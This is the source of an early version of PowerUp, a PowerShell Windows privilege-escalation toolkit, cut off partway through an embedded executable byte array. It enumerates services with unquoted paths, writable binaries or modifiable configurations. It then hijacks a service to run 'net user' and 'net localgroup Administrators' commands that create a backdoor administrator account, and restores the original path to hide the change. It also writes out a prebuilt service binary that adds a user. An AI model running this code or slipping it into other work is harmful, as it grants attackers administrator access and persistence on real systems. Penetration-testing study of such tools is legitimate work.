<#

PowerUp v1.0

Various nethods to abuse local services to assist
with escalation on Windows systems.

See README.md for more information.

by: @harmj0y

#>


function Get-ServiceUnquoted {
    <#
    .SYNOPSIS
    Returns the name and binary path for services with unquoted paths
    that also have a space in the name.
    
    .DESCRIPTION
    This function finds all services whose binary paths are unquoted,
    and where a space exists in the path name.
    
    .OUTPUTS
    System.Collections.Specialized.OrderedDictionary. 
    A set of {name, binaryPath} for each vulnerable service.
    
    .EXAMPLE
    > $services = Get-ServiceUnquoted
    Get a set of potentially exploitable services.

    .LINK
    https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/trusted_service_path.rb
    #>

    # find all paths to service .exe's that have a space in the path and aren't quoted
    $VulnServices = gwmi win32_service | where {-not $_.pathname.StartsWith("`"")} | where {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -match ".* .*"}
    
    foreach ($service in $VulnServices){
        $out = New-Object System.Collections.Specialized.OrderedDictionary
        $out.add('ServiceName', $service.name)
        $out.add('Path', $service.pathname)
        $out    
    }
}


function Get-ServiceEXEPerms {
    <#
    .SYNOPSIS
    Returns the name and path for any service where the current 
    user can write to the associated binary.
    
    .DESCRIPTION
    This function finds all services where the current user can 
    write to the associated binary. If the associated binary is 
    overwritten, privileges may be able to be escalated.
    
    .OUTPUTS
    System.Collections.Specialized.OrderedDictionary. 
    A set of {name, binaryPath} for each vulnerable service.
    
    .EXAMPLE
    > $services = Get-ServiceEXEPerms
    Get a set of potentially exploitable services.
    #> 
    
    # get all paths to service executables that aren't in C:\Windows\System32\*
    $services = gwmi win32_service | where {$_.pathname -notmatch ".*system32.*"} 
    
    # try to open each for writing, print the name if successful
    foreach ($service in $services){
        try{
            # strip out any arguments and get just the executable
            $path = ($service.pathname.Substring(0, $service.pathname.IndexOf(".exe") + 4)).Replace("`"","")

            if (Test-Path $path){
                # try to open the file for writing, immediately closing it
                $file = Get-Item $path -Force
                $stream = $file.OpenWrite()
                $stream.Close() | Out-Null

                $out = New-Object System.Collections.Specialized.OrderedDictionary
                $out.add('ServiceName', $service.name)
                $out.add('Path', $service.pathname)
                $out    
            }
        }
        catch{
            # if we have access but it's open by another process, return it
            if (($_.ToString()).contains("by another process")){
                $out = New-Object System.Collections.Specialized.OrderedDictionary
                $out.add('ServiceName', $service.name)
                $out.add('Path', $service.pathname)
                $out
            }
        } 
    }
}


function Get-ServicePerms {
    <#
    .SYNOPSIS
    Returns a list of services that the user can modify.
    
    .DESCRIPTION
    This function enumerates all available services and tries to
    open the service for modification, returning the service object
    if the process doesn't failed.
    
    .OUTPUTS
    System.Collections.Specialized.OrderedDictionary. 
    A set of {name, binaryPath} for each vulnerable service.
    
    .EXAMPLE
    > $services = Get-ServicePerms
    Get a set of potentially exploitable services.
    #> 


    $services = gwmi win32_service
        
    foreach ($service in $services){

        $returnValue = ($service | Invoke-WmiMethod -Name Change -ArgumentList @($null)).ReturnValue

        # if we get a 0, that means we can modify the service
        if ($returnValue -eq 0){
            $out = New-Object System.Collections.Specialized.OrderedDictionary
            $out.add('ServiceName', $service.name)
            $out.add('Path', $service.pathname)
            $out
        }

    }

}


function Invoke-ServiceUserAdd {
    <#
    .SYNOPSIS
    Modifies a target service to create a local user and add it
    to the local administrators.
    
    .DESCRIPTION
    This function stops a service, modifies it to create a user, starts
    the service, stops it, modifies it to add the user to the specified group,
    stops it, and then restores the original EXE path.
    
    .PARAMETER ServiceName
    The service name to manipulate. Required.

    .PARAMETER UserName
    The username to add. If not given, it defaults to "john"

    .PARAMETER Password
    The password to set for the added user. If not given, it defaults to "Password123!"

    .PARAMETER GroupName
    Group to add the user to (default of Administrators)
        
    .OUTPUTS
    System.bool. True if the add succeeded, false otherwise.

    .EXAMPLE
    > Invoke-ServiceUserAdd -ServiceName VulnSVC
    Abuses service 'VulnSVC' to add a localuser "john" with password 
    "Password123! to the  machine and local administrator group

    .EXAMPLE
    > Invoke-ServiceUserAdd -ServiceName VulnSVC -UserName backdoor -Password password -GroupName "Power Users"
    Abuses service 'VulnSVC' to add a localuser "backdoor" with password 
    "password" to the  machine and local "Power Users" group
    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)] [string]$ServiceName,
        [string]$UserName = "john",
        [string]$Password = "Password123!",
        [string]$GroupName = "Administrators"
    )

    # query WMI for the service
    $TargetService = gwmi win32_service -Filter "Name='$ServiceName'"

    # make sure we got a result back
    if ($TargetService){
        try{

            # try to enable the service it was it was disabled
            $RestoreDisabled = $false
            if ($TargetService.StartMode -eq "Disabled"){
                Write-Verbose "Service '$ServiceName' disabled, enabling..."
                $TargetService | Invoke-WmiMethod -Name ChangeStartMode -ArgumentList @("Manual") | Out-Null
                $RestoreDisabled = $true
            }

            # extract the original path and state so we can restore it later
            $OriginalPath = $TargetService.PathName
            $OriginalState = $TargetService.State
            Write-Verbose "Service '$ServiceName' original path: '$OriginalPath'"
            Write-Verbose "Service '$ServiceName' original state: '$OriginalState'"

            Write-Verbose "Adding user '$UserName'"
            # stop the service
            $TargetService | Invoke-WmiMethod -Name StopService | Out-Null
            # modify the service path to add a user
            $UserAddCommand = "net user $UserName $Password /add"
            # change the path name to the user add command
            $TargetService | Invoke-WmiMethod -Name Change -ArgumentList @($null, $null, $null, $null, $null, $UserAddCommand) | Out-Null
            # start the service and breath
            $TargetService | Invoke-WmiMethod -Name StartService | Out-Null
            Start-Sleep -s 1

            Write-Verbose "Adding user '$UserName' to group '$GroupName'"
            # stop the service
            $TargetService | Invoke-WmiMethod -Name StopService | Out-Null
            # modify the service path to add the user to the specified local group
            $GroupAddCommand = "net localgroup $GroupName $UserName /add"
            # change the path name to the group add command
            $TargetService | Invoke-WmiMethod -Name Change -ArgumentList @($null, $null, $null, $null, $null, $GroupAddCommand) | Out-Null
            # start the service and breath
            $TargetService | Invoke-WmiMethod -Name StartService | Out-Null
            Start-Sleep -s 1

            Write-Verbose "Restoring original path to service '$ServiceName'"
            # stop the service
            $TargetService | Invoke-WmiMethod -Name StopService | Out-Null
            # restore the original binary path
            $TargetService | Invoke-WmiMethod -Name Change -ArgumentList @($null, $null, $null, $null, $null, $OriginalPath) | Out-Null
            
            # try to restore the service to whatever state it was
            if ($RestoreDisabled){
                Write-Verbose "Re-disabling service '$ServiceName'"
                $TargetService | Invoke-WmiMethod -Name ChangeStartMode -ArgumentList @("Disabled") | Out-Null
            }
            elseif ($OriginalState -eq "Paused"){
                Write-Verbose "Starting and then pausing service '$ServiceName'"
                $TargetService | Invoke-WmiMethod -Name StartService | Out-Null
                $TargetService | Invoke-WmiMethod -Name PauseService | Out-Null
            }
            elseif ($OriginalState -eq "Stopped"){
                Write-Verbose "Leaving service '$ServiceName' in stopped state"
            }
            else{
                Write-Verbose "Starting service '$ServiceName'"
                $TargetService | Invoke-WmiMethod -Name StartService | Out-Null
            }

            $true

        }
        catch{
            Write-Warning "Error while modifying service '$ServiceName': $_"
            $false
        }
    }

    else{
        Write-Warning "Target service '$ServiceName' not found on the machine"
        $false
    }
}


function Write-UserAddServiceBinary {
    <#
    .SYNOPSIS
    Writes out a C# service executable that adds a user to the specified 
    path.

    .DESCRIPTION
    This function takes a precompiled C# service executable and binary
    patches in the service name, and username/password/groupname to add.
    It then writes the binary out to the specified location.
    
    .PARAMETER ServiceName
    The service name the EXE will be running under. Required.

    .PARAMETER Path
    Path to write the binary out to. Defaults to the local directory.

    .PARAMETER UserName
    The username to add. If not given, it defaults to "john"

    .PARAMETER Password
    The password to set for the added user. If not given, it defaults to "Password123!"

    .PARAMETER GroupName
    Group to add the user to (default of Administrators)

    .OUTPUTS
    System.bool. True if the write succeeded, false otherwise.

    .EXAMPLE
    > Write-UserAddServiceBinary -ServiceName VulnSVC
    Writes the service binary for VulnSVC to the local directory.
    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)] [string]$ServiceName,
        [string]$Path = "service.exe",
        [string]$UserName = "john",
        [string]$Password = "Password123!",
        [string]$GroupName = "Administrators"
    )

    # the raw unpatched service binary
    [Byte[]] $Binary = 0x4d,0x5a,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x0e,0x1f,0xba,0x0e,0x00,0xb4,0x09,0xcd,0x21,0xb8,0x01,0x4c,0xcd,0x21,0x54,0x68,0x69,0x73,0x20,0x70,0x72,0x6f,0x67,0x72,0x61,0x6d,0x20,0x63,0x61,0x6e,0x6e,0x6f,0x74,0x20,0x62,0x65,0x20,0x72,0x75,0x6e,0x20,0x69,0x6e,0x20,0x44,0x4f,0x53,0x20,0x6d,0x6f,0x64,0x65,0x2e,0x0d,0x0d,0x0a,0x24,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,0x45,0x00,0x00,0x4c,0x01,0x03,0x00,0x69,0x99,0x56,0x53,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe0,0x00,0x02,0x01,0x0b,0x01,0x08,0x00,0x00,0x0e,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0xee,0x2c,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x20,0x00,0x00,0x00,0x02,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x40,0x85,0x00,0x00,0x10,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x9c,0x2c,0x00,0x00,0x4f,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x30,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x0c,0x00,0x00,0x00,0x0c,0x2c,0x00,0x00,0x1c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08,0x20,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x2e,0x74,0x65,0x78,0x74,0x00,0x00,0x00,0xf4,0x0c,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x0e,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x60,0x2e,0x72,0x73,0x72,0x63,0x00,0x00,0x00,0x30,0x05,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x40,0x2e,0x72,0x65,0x6c,0x6f,0x63,0x00,0x00,0x0c,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x16,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x42,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd0,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x02,0x00,0x05,0x00,0xcc,0x21,0x00,0x00,0x40,0x0a,0x00,0x00,0x01,0x00,0x00,0x00,0x02,0x00,0x00,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x13,0x30,0x02,0x00,0x20,0x00,0x00,0x00,0x01,0x00,0x00,0x11,0x02,0x28,0x10,0x00,0x00,0x0a,0x72,0x01,0x00,0x00,0x70,0x0a,0x02,0x06,0x6f,0x11,0x00,0x00,0x0a,0x28,0x12,0x00,0x00,0x0a,0x02,0x17,0x28,0x13,0x00,0x00,0x0a,0x2a,0x2e,0x73,0x01,0x00,0x00,0x06,0x28,0x14,0x00,0x00,0x0a,0x2a,0x13,0x30,0x04,0x00,0x09,0x01,0x00,0x00,0x02,0x00,0x00,0x11,0x02,0x03,0x28,0x15,0x00,0x00,0x0a,0x72,0x3f,0x00,0x00,0x70,0x0a,0x72,0x7d,0x00,0x00,0x70,0x0b,0x72,0xbb,0x00,0x00,0x70,0x0c,0x72,0xf9,0x00,0x00,0x70,0x1b,0x8d,0x13,0x00,0x00,0x01,0x13,0x07,0x11,0x07,0x16,0x72,0x01,0x01,0x00,0x70,0xa2,0x11,0x07,0x17,0x06,0x6f,0x11,0x00,0x00,0x0a,0xa2,0x11,0x07,0x18,0x72,0x1b,0x01,0x00,0x70,0xa2,0x11,0x07,0x19,0x07,0x6f,0x11,0x00,0x00,0x0a,0xa2,0x11,0x07,0x1a,0x72,0x1f,0x01,0x00,0x70,0xa2,0x11,0x07,0x28,0x16,0x00,0x00,0x0a,0x73,0x17,0x00,0x00,0x0a,0x0d,0x09,0x17,0x6f,0x18,0x00,0x00,0x0a,0x09,0x16,0x6f,0x19,0x00,0x00,0x0a,0x09,0x17,0x6f,0x1a,0x00,0x00,0x0a,0x73,0x1b,0x00,0x00,0x0a,0x13,0x04,0x11,0x04,0x09,0x6f,0x1c,0x00,0x00,0x0a,0x11,0x04,0x6f,0x1d,0x00,0x00,0x0a,0x26,0x72,0xf9,0x00,0x00,0x70,0x1b,0x8d,0x13,0x00,0x00,0x01,0x13,0x08,0x11,0x08,0x16,0x72,0x2b,0x01,0x00,0x70,0xa2,0x11,0x08,0x17,0x08,0x6f,0x11,0x00,0x00,0x0a,0xa2,0x11,0x08,0x18,0x72,0x1b,0x01,0x00,0x70,0xa2,0x11,0x08,0x19,0x06,0x6f,0x11,0x00,0x00,0x0a,0xa2,0x11,0x08,0x1a,0x72,0x1f,0x01,0x00,0x70,0xa2,0x11,0x08,0x28,0x16,0x00,0x00,0x0a,0x73,0x17,0x00,0x00,0x0a,0x13,0x05,0x11,0x05,0x17,0x6f,0x18,0x00,0x00,0x0a,0x11,0x05,0x16,0x6f,0x19,0x00,0x00,0x0a,0x11,0x05,0x17,0x6f,0x1a,0x00,0x00,0x0a,0x73,0x1b,0x00,0x00,0x0a,0x13,0x06,0x11,0x06,0x11,0x05,0x6f,0x1c,0x00,0x00,0x0a,0x11,0x06,0x6f,0x1d,0x00,0x00,0x0a,0x26,0x2a,0x1e,0x02,0x28,0x1e,0x00,0x00,0x0a,0x2a,0x1a,0x7e,0x01,0x00,0x00,0x04,0x2a,0x56,0x73,0x06,0x00,0x00,0x06,0x28,0x21,0x00,0x00,0x0a,0x74,0x03,0x00,0x00,0x02,0x80,0x01,0x00,0x00,0x04,0x2a,0x1e,0x02,0x28,0x22,0x00,0x00,0x0a,0x2a,0x00,0x00,0x42,0x53,0x4a,0x42,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x76,0x32,0x2e,0x30,0x2e,0x35,0x30,0x37,0x32,0x37,0x00,0x00,0x00,0x00,0x05,0x00,0x6c,0x00,0x00,0x00,0x10,0x03,0x00,0x00,0x23,0x7e,0x00,0x00,0x7c,0x03,0x00,0x00,0xec,0x03,0x00,0x00,0x23,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x00,0x00,0x00,0x68,0x07,0x00,0x00,0x54,0x01,0x00,0x00,0x23,0x55,0x53,0x00,0xbc,0x08,0x00,0x00,0x10,0x00,0x00,0x00,0x23,0x47,0x55,0x49,0x44,0x00,0x00,0x00,0xcc,0x08,0x00,0x00,0x74,0x01,0x00,0x00,0x23,0x42,0x6c,0x6f,0x62,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x01,0x57,0x15,0xa2,0x01,0x09,0x00,0x00,0x00,0x00,0xfa,0x01,0x33,0x00,0x16,0x00,0x00,0x01,0x00,0x00,0x00,0x18,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x22,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x0a,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x06,0x00,0x57,0x00,0x41,0x00,0x0a,0x00,0x7f,0x00,0x6a,0x00,0x0e,0x00,0xf5,0x00,0xe3,0x00,0x0e,0x00,0x0c,0x01,0xe3,0x00,0x0e,0x00,0x29,0x01,0xe3,0x00,0x0e,0x00,0x48,0x01,0xe3,0x00,0x0e,0x00,0x61,0x01,0xe3,0x00,0x0e,0x00,0x7a,0x01,0xe3,0x00,0x0e,0x00,0x95,0x01,0xe3,0x00,0x0e,0x00,0xb0,0x01,0xe3,0x00,0x0e,0x00,0xe8,0x01,0xc9,0x01,0x0e,0x00,0xfc,0x01,0xc9,0x01,0x0e,0x00,0x0a,0x02,0xe3,0x00,0x0e,0x00,0x23,0x02,0xe3,0x00,0x0e,0x00,0x53,0x02,0x40,0x02,0x3f,0x00,0x67,0x02,0x00,0x00,0x0e,0x00,0x96,0x02,0x76,0x02,0x0e,0x00,0xb6,0x02,0x76,0x02,0x0e,0x00,0xdc,0x02,0x63,0x00,0x0a,0x00,0x0f,0x03,0x40,0x02,0x0a,0x00,0x62,0x03,0x40,0x02,0x0e,0x00,0x7e,0x03,0x76,0x02,0x0a,0x00,0xb1,0x03,0x99,0x03,0x0a,0x00,0xcf,0x03,0x6a,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x10,0x00,0x16,0x00,0x16,0x00,0x05,0x00,0x01,0x00,0x01,0x00,0x00,0x01,0x10,0x00,0x25,0x00,0x2e,0x00,0x09,0x00,0x01,0x00,0x05,0x00,0x11,0x00,0xb1,0x00,0x21,0x00,0x50,0x20,0x00,0x00,0x00,0x00,0x86,0x18,0x97,0x00,0x13,0x00,0x01,0x00,0x7c,0x20,0x00,0x00,0x00,0x00,0x91,0x00,0x9d,0x00,0x17,0x00,0x01,0x00,0x88,0x20,0x00,0x00,0x00,0x00,0xc4,0x00,0xa2,0x00,0x1b,0x00,0x01,0x00,0x9d,0x21,0x00,0x00,0x00,0x00,0xc4,0x00,0xaa,0x00,0x13,0x00,0x02,0x00,0xa5,0x21,0x00,0x00,0x00,0x00,0x96,0x08,0xc1,0x00,0x25,0x00,0x02,0x00,0xc2,0x21,0x00,0x00,0x00,0x00,0x86,0x18,0x97,0x00,0x13,0x00,0x02,0x00,0xac,0x21,0x00,0x00,0x00,0x00,0x91,0x18,0xc8,0x03,0x17,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0xd5,0x00,0x19,0x00,0x97,0x00,0x2f,0x00,0x21,0x00,0x97,0x00,0x2f,0x00,0x29,0x00,0x97,0x00,0x2f,0x00,0x31,0x00,0x97,0x00,0x2f,0x00,0x39,0x00,0x97,0x00,0x2f,0x00,0x41,0x00,0x97,0x00,0x2f,0x00,0x49,0x00,0x97,0x00,0x2f,0x00,0x51,0x00,0x97,0x00,0x2f,0x00,0x59,0x00,0x97,0x00,0x34,0x00,0x61,0x00,0x97,0x00,0x2f,0x00,0x69,0x00,0x97,0x00,0x2f,0x00,0x71,0x00,0x97,0x00,0x2f,0x00,0x79,0x00,0x97,0x00,0x39,0x00,0x89,0x00,0x97,0x00,0x3f,0x00,0x91,0x00,0x97,0x00,0x13,0x00,0x09,0x00,0x97,0x00,0x13,0x00,0x99,0x00,0xe3,0x02,0x44,0x00,0x09,0x00,0xe8,0x02,0x2f,0x00,0x09,0x00,0xf8,0x02,0x34,0x00,0x09,0x00,0x04,0x03,0x4c,0x00,0x09,0x00,0xa2,0x00,0x1b,0x00,0x99,0x00,0x08,0x03,0x52,0x00,0xa1,0x00,0x97,0x00,0x58,0x00,0xa1,0x00,0x20,0x03,0x34,0x00,0xa1,0x00,0x3b,0x03,0x34,0x00,0xa1,0x00,0x4f,0x03,0x34,0x00,0xa9,0x00,0x97,0x00,0x13,0x00,0xa9,0x00,0x6a,0x03,0x5e,0x00,0xa9,0x00,0x78,0x03,0x64,0x00,0x09,0x00,0xaa,0x00,0x13,0x00,0xb1,0x00,0x97,0x00,0x13,0x00,0xb9,0x00,0x97,0x00,0x58,0x00,0xc1,0x00,0xdc,0x03,0xd8,0x00,0x11,0x00,0x97,0x00,0x13,0x00,0x2e,0x00,0x33,0x00,0xf2,0x00,0x2e,0x00,0x7b,0x00,0x53,0x01,0x2e,0x00,0x0b,0x00,0xdf,0x00,0x2e,0x00,0x13,0x00,0xec,0x00,0x2e,0x00,0x1b,0x00,0xec,0x00,0x2e,0x00,0x23,0x00,0xec,0x00,0x2e,0x00,0x2b,0x00,0xdf,0x00,0x2e,0x00,0x3b,0x00,0xec,0x00,0x2e,0x00,0x4b,0x00,0xec,0x00,0x2e,0x00,0x53,0x00,0x0a,0x01,0x2e,0x00,0x63,0x00,0x34,0x01,0x2e,0x00,0x6b,0x00,0x41,0x01,0x2e,0x00,0x73,0x00,0x4a,0x01,0x63,0x00,0x03,0x01,0x7f,0x00,0x63,0x00,0xfb,0x00,0x7a,0x00,0x48,0x00,0x68,0x00,0x03,0x00,0x01,0x00,0x00,0x00,0xcd,0x00,0x2a,0x00,0x02,0x00,0x05,0x00,0x03,0x00,0x04,0x80,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd4,0x02,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x41,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0a,0x00,0x63,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0a,0x00,0xda,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3c,0x4d,0x6f,0x64,0x75,0x6c,0x65,0x3e,0x00,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x2e,0x65,0x78,0x65,0x00,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x00,0x53,0x65,0x74,0x74,0x69,0x6e,0x67,0x73,0x00,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x2e,0x50,0x72,0x6f,0x70,0x65,0x72,0x74,0x69,0x65,0x73,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x00,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x42,0x61,0x73,0x65,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x43,0x6f,0x6e,0x66,0x69,0x67,0x75,0x72,0x61,0x74,0x69,0x6f,0x6e,0x00,0x41,0x70,0x70,0x6c,0x69,0x63,0x61,0x74,0x69,0x6f,0x6e,0x53,0x65,0x74,0x74,0x69,0x6e,0x67,0x73,0x42,0x61,0x73,0x65,0x00,0x2e,0x63,0x74,0x6f,0x72,0x00,0x4d,0x61,0x69,0x6e,0x00,0x4f,0x6e,0x53,0x74,0x61,0x72,0x74,0x00,0x4f,0x6e,0x53,0x74,0x6f,0x70,0x00,0x64,0x65,0x66,0x61,0x75,0x6c,0x74,0x49,0x6e,0x73,0x74,0x61,0x6e,0x63,0x65,0x00,0x67,0x65,0x74,0x5f,0x44,0x65,0x66,0x61,0x75,0x6c,0x74,0x00,0x44,0x65,0x66,0x61,0x75,0x6c,0x74,0x00,0x61,0x72,0x67,0x73,0x00,0x6d,0x73,0x63,0x6f,0x72,0x6c,0x69,0x62,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x65,0x66,0x6c,0x65,0x63,0x74,0x69,0x6f,0x6e,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x54,0x69,0x74,0x6c,0x65,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x44,0x65,0x73,0x63,0x72,0x69,0x70,0x74,0x69,0x6f,0x6e,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x43,0x6f,0x6e,0x66,0x69,0x67,0x75,0x72,0x61,0x74,0x69,0x6f,0x6e,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x43,0x6f,0x6d,0x70,0x61,0x6e,0x79,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x50,0x72,0x6f,0x64,0x75,0x63,0x74,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x43,0x6f,0x70,0x79,0x72,0x69,0x67,0x68,0x74,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x54,0x72,0x61,0x64,0x65,0x6d,0x61,0x72,0x6b,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x43,0x75,0x6c,0x74,0x75,0x72,0x65,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x75,0x6e,0x74,0x69,0x6d,0x65,0x2e,0x49,0x6e,0x74,0x65,0x72,0x6f,0x70,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x73,0x00,0x43,0x6f,0x6d,0x56,0x69,0x73,0x69,0x62,0x6c,0x65,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x47,0x75,0x69,0x64,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x56,0x65,0x72,0x73,0x69,0x6f,0x6e,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x46,0x69,0x6c,0x65,0x56,0x65,0x72,0x73,0x69,0x6f,0x6e,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x44,0x69,0x61,0x67,0x6e,0x6f,0x73,0x74,0x69,0x63,0x73,0x00,0x44,0x65,0x62,0x75,0x67,0x67,0x61,0x62,0x6c,0x65,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x44,0x65,0x62,0x75,0x67,0x67,0x69,0x6e,0x67,0x4d,0x6f,0x64,0x65,0x73,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x75,0x6e,0x74,0x69,0x6d,0x65,0x2e,0x43,0x6f,0x6d,0x70,0x69,0x6c,0x65,0x72,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x73,0x00,0x43,0x6f,0x6d,0x70,0x69,0x6c,0x61,0x74,0x69,0x6f,0x6e,0x52,0x65,0x6c,0x61,0x78,0x61,0x74,0x69,0x6f,0x6e,0x73,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x52,0x75,0x6e,0x74,0x69,0x6d,0x65,0x43,0x6f,0x6d,0x70,0x61,0x74,0x69,0x62,0x69,0x6c,0x69,0x74,0x79,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x00,0x53,0x74,0x72,0x69,0x6e,0x67,0x00,0x54,0x72,0x69,0x6d,0x00,0x73,0x65,0x74,0x5f,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x4e,0x61,0x6d,0x65,0x00,0x73,0x65,0x74,0x5f,